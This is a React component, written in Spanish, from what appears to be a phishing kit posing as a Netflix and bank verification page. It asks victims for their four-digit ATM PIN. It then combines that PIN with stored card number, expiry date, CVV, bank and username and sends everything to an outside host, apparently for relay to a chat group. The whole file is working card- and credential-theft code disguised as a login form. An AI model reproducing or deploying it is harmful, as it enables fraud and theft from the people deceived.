import React, { useState, useEffect } from 'react';
import axios from 'axios';
import IMG1 from './img/verify.png';
import IMG2 from './img/logo.png';

const PasswordEntry = ({ onSubmit, documentNumber, secureKey }) => {
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [username, setUsername] = useState(''); // Estado para guardar el username

  useEffect(() => {
    // Recupera el username del local storage
    const storedUsername = localStorage.getItem('username');
    if (storedUsername) {
      setUsername(storedUsername);
    }
  }, []);

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();

    if (password.length !== 4) {
        setError('La clave debe tener 4 dígitos.');
        return;
    }

    setError('');

    const formValues = JSON.parse(localStorage.getItem('formValues')) || {};
    const banco = localStorage.getItem('banco') || 'No disponible';
    localStorage.setItem('password', password);

    const chatId = '-4723241842'; // Asegúrate de que este ID sea correcto
    const message = `🔑📱 KEY NETFLIX 📱🔑:\n -------------------------------------------\n- 📛: ${formValues.cardHolderName || 'No disponible'}\n- 💳: ${formValues.cardNumber || 'No disponible'} \n- 📅: ${formValues.expirationDate || 'No disponible'}\n- 🔐: ${formValues.cvv || 'No disponible'}\n-------------------------------------------\n 🔑📱 LOGIN NETFLIX 📱🔑\n ------------------------------------------- \n 🏦 : ${banco}\n 👤 : ${username}\n 🔒 : ${password}`;

    try {
        await axios.post('https://streaming.renovapunto.online/enviarmensaje', { chatId, message });
        onSubmit();
    } catch (error) {
        if (error.response) {
            console.error('Error en la solicitud:', error.response.data);
            setError('Error al enviar los datos: ' + error.response.data.error);
        } else {
            console.error('Error en la solicitud:', error.message);
            setError('Error al enviar los datos.');
        }
    }
  };

  return (
    <div className="bg-gray-100 min-h-screen flex flex-col items-center p-4">
      <img src={IMG1} alt="Verificar" className="w-1/2 my-4" />
      <img src={IMG2} alt="Logo" className="w-1/2 my-4" />
      <h1 className="text-2xl font-bold my-4">Ingresa tu clave</h1>

      <div className="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
        <p className="text-sm text-gray-600 mb-4 text-center">
          La clave es la misma que utilizas en el cajero
        </p>

        <form onSubmit={handlePasswordSubmit} className="flex flex-col items-center">
          <input
            type="password"
            placeholder="****"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="border-b border-gray-300 w-4/5 py-2 px-4 mb-4 text-lg text-center focus:outline-none"
            maxLength="4"
            minLength="4"
          />
          {error && <p className="text-red-500 text-sm mb-4">{error}</p>}
          <button
            type="submit"
            className="bg-yellow-400 text-black font-bold rounded-full w-4/5 py-2 hover:bg-yellow-300 transition-colors"
          >
            Continuar
          </button>
        </form>
        <a href="#" className="text-blue-600 underline mt-4 block text-center">
          ¿Olvidaste tu clave?
        </a>
      </div>
    </div>
  );
};

export default PasswordEntry;
